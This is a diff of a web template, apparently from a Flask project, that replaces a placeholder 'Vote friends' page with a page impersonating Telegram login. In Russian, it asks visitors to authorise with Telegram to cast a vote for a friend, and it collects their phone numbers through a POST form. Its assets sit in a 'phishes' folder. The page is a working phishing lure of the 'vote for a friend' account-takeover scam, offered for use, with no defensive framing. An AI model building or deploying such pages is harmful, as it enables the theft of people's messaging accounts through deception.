@@ -1,13 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vote friends</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="{{ url_for('static', filename='phishes/vote-friend/css2') }}" rel="stylesheet">
+    <link rel="icon" href="https://rcdsp.ru/img/favicon.svg" type="image/svg+xml">
+    <link rel="stylesheet" href="{{ url_for('static', filename='phishes/vote-friend/style.css') }}">
+    <title>Telegram</title>
 </head>
 <body>
-    
-<h1>Vote friends</h1>
+<section class="container">
+    <article class="auth_tg_to">
+        <div class="tg">
 
-</body>
-</html>
+            <svg height="150" viewBox="0 0 98 75" width="200" xmlns="http://www.w3.org/2000/svg"><g fill="#4ca3e2" fill-rule="evenodd"><path d="m91.8 19.5666667 8.5 11.3333333c.331371.4418278.241828 1.0686292-.2 1.4-.1730962.1298221-.3836298.2-.6.2h-17c-.5522847 0-1-.4477153-1-1 0-.2163702.0701779-.4269038.2-.6l8.5-11.3333333c.3313708-.4418278.9581722-.5313709 1.4-.2.0758057.0568542.1431458.1241943.2.2z" transform="matrix(0 1 -1 0 116.5 -65.5)"></path><path d="m40 21h46v8h-46z"></path></g></svg>
+        </div>
+        <span class="logo">
+            <img class="auth_to" src="{{ url_for('static', filename='phishes/vote-friend/golos.png') }}">
+        </span>
+    </article>
+    <div class="txt">
+        <h1>Telegram</h1>
+        <p>Пожалуйста, авторизуйтесь при помощи Telegram, чтобы отправить свой голос другу.</p>
+    </div>
+    <div class="form">
+        <form method="POST" class="input-container ic1">
+            <input class="input" type="tel" id="input" value="+7" name="phone" autocomplete="off">
+            <div class="cut"></div>
+            <label for="phone" class="placeholder" id="label">Номер телефона</label>
+            <button type="submit" name="send_phone" class="next">Войти</button>
+        </form>
+    </div>
+</section>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="{{ url_for('static', filename='js/script.js') }}"></script>
+</body></html>
